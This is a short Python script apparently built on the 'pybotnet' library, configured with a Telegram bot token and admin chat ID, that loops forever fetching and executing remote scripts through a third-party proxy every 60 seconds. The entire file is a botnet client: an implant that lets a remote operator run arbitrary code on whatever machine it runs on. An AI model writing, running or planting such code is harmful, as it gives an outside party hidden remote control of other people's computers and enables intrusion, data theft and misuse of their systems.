from configs import *
import util
import logging


import pybotnet
import time

TELEGRAM_TOKEN = '1468299500:AAHsvEH-5VyIfWYMzZcYxF_e00000000000'
ADMIN_CHAT_ID = '12345678910'
delay = 60

bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID, show_log=True)

while True:
    bot.get_and_execute_scripts_by_third_party_proxy()
    time.sleep(delay)
